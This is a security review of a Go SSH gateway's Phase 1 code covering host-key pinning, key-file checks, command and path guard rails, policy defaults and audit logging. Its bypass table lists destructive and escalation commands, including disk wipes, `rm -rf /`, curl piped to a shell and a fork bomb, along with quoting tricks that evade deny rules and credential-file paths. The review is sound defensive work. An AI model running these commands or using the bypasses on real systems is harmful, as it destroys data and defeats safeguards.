# Phase 1 security review

Verdict: **BLOCK** -- one small blocking finding; the rest is advisory. Range `6cc1f31..1546eb6`. Read-only: no tests, builds or gate were run. Guard-rail bypasses were evaluated by transcribing the patterns into a scratch regex script outside the repo, not with Go's regexp engine.

## BLOCKING

**1. `known_hosts_file` accepts `@cert-authority` lines and counts them as a pinned key** -- `internal/config/files.go:95-110`. `checkKnownHosts` probes the `knownhosts.New` callback and passes when `KeyError.Want` is non-empty. In `x/crypto` v0.59.0 `checkAddr` (`knownhosts.go:379-398`) appends every matching line to `Want`, CA lines included, so a file holding only a `@cert-authority` line for the host passes `config check`. The same callback is a `CertChecker` (`knownhosts.go:457-462`), so once Phase 2 dials with it any host certificate that CA signs is accepted, and the CA key itself is accepted as a plain host key. That contradicts D13, D18 (`host_key` refuses certificates at `rules.go:139`) and the section 6 guarantee about changed host keys. Also: any callback result other than an empty `KeyError` counts as success (`files.go:105-109`, fail-open), and a host whose only listed key is also `@revoked` passes. No test covers markers, hashed hosts or wildcards. Fix: read the file (capped), refuse any `@cert-authority` line with the D18 message; accept only when the probe returns a `KeyError` with keys and at least one of them, replayed through the callback, returns nil; add tests for CA, revoked, hashed and wildcard lines.

## ADVISORY

**2. Private key check is on the path, not the open file** -- `files.go:38,62,68`: `os.Stat`, mode test, then `os.ReadFile` (TOCTOU; symlinks followed; owner never checked; unbounded read). Harmless in Phase 1 (bytes are parsed, cleared, never returned), but Phase 2 reads the key for use. Fix: open once, `f.Stat()`, check regular, mode and owner uid, read through `io.LimitReader`; export it so the SSH layer re-checks at use, as `audit.Open` does.

**3. Command rails: one class of bypass is too cheap** (`policy/commands.go:24-33`). Quoting or backslashing the command word or its target defeats every command-position rule. Fix: tolerate `["'\\]*` before the word and path and around device and `/` targets; add `eval` to `wrappers`; reuse `wrappers` in `pipe-to-shell`. Simplest bypass per rule -- (a) should be caught, (b) accepted, document:

| Rule | (a) | (b) |
|---|---|---|
| `sudo` | `\sudo id`, `eval sudo id` | `$(echo sudo) id`, `env -u X sudo id` |
| `su`, `doas`, `pkexec`, `run0` | `\su -`, `'pkexec' sh` | `flock /tmp/l su` |
| `power-control` | `'reboot'` | `systemctl start reboot.target` |
| `init-runlevel` | -- | `telinit -t 5 0` |
| `systemctl-power` | -- | `systemctl -H h reboot` |
| `fs-create` | `'mkfs.ext4' /dev/sda1` | `blkdiscard /dev/sda` |
| `dd-to-device` | `of="/dev/sda"` | `of=/dev/nbd0`, LVM paths |
| `write-to-device` | `>'/dev/sda'` | `cp x /dev/sda` |
| `rm-root` | `rm -rf "/"` | `rm -rf /etc`, `find / -delete` |
| `rm-no-preserve-root` | quotes inside the option | -- |
| `pipe-to-shell` | `curl U \| exec sh`, `\| 'sh'`, backslash-newline before the pipe | `curl -o f U; sh f` |
| `download-substitution` | -- | `x=$(curl U); eval "$x"` |
| `fork-bomb` | -- | `function f { f\|f& }; f` |

NUL, invalid UTF-8, empty and length (bytes, before trimming) are handled; CR and newline are separators; look-alike and zero-width characters do not form a real command word.

**4. Path rails** (`policy/paths.go:37-56`). (a) `/proc/self/root/<path>` defeats every whole-path rule with no planted symlink; `/home/*/...` globs miss nested or non-`/home` homes and `gcloud` subdirectories; `/var/backups/shadow.bak`, `privkey.pem` and `*.keytab` are absent. Fix: a suffix or prefix rule kind (`**/.aws/credentials`, `/proc/*/root/**`, `/proc/*/cwd/**`). (b) custom key names, `.envrc`, `/proc/*/cmdline`. Traversal, `//`, trailing slash, relative paths and the target-symlink limit are handled or documented.

**5. Policy zero values fail open** -- `policy/policy.go:185-191`: a `Tool` with `Requires` unset needs `none`, which every server grants. `NewEngine` (`:143-153`) accepts tenant id `""`, so the zero `Principal` can match. Fix: deny when the required level is `AccessNone`, when `p.Tenant == ""` or `p.Kind == 0`; refuse the empty id. Unreachable from the loader today.

**6. Audit log** (`audit/audit.go`). After a failed write the partial line stays; on restart the first event is appended to it and both become unparseable (`:68`, `:115-121`) -- on `Open`, end an unterminated last line. Owner uid is not checked (`:81`). `O_NOFOLLOW` covers the last component only; enough given section 6 (root is out of scope), but undocumented. A FIFO at the path blocks `Open`. `GatewayStopped(reason)` and `RequestID` are free strings: use a closed set; generate the id server-side.

**7. Loader hardening.** No cap on the number of `deny_commands`/`deny_paths` entries (`decode.go:741-756`). `rules.go:154` echoes the operator's pattern raw into the problem line (control characters reach the terminal; use `%q`). `tenant.go:189` `strings.EqualFold` folds Unicode (Kelvin sign, long s); compare ASCII-only or require ASCII emails.

## Checked and clean

- No struct holds key bytes; no error, `String` or `config check` output carries file content; the audit record has no token, header or content field; command text only where 5.4 says.
- `full` is unreachable from YAML (`!!str` tag, exact match); aliases are refused without expansion (decoded into `yaml.Node`); 1 MiB cap before the read; duplicate and non-string keys, huge integers, `MaxTenants`, and the `listen` and `certs_url` spoofing forms all hold.
- Tenant check first, foreign id identical to missing; `Permits` is the only comparison.
- `Before` never acts after a write or sync failure; failure is sticky; one locked write per event; JSON escaping prevents line injection; the timestamp is the logger's.
- Dependencies: only `go.yaml.in/yaml/v3` v3.0.6 and `golang.org/x/crypto` v0.59.0 (plus `x/sys`), tagged releases, checksum database on; `govulncheck` clean. CI, `mise.toml` and `scripts/` unchanged.
- Hygiene: only `example.net` names, loopback and documentation addresses, generated keys; commit messages clean.
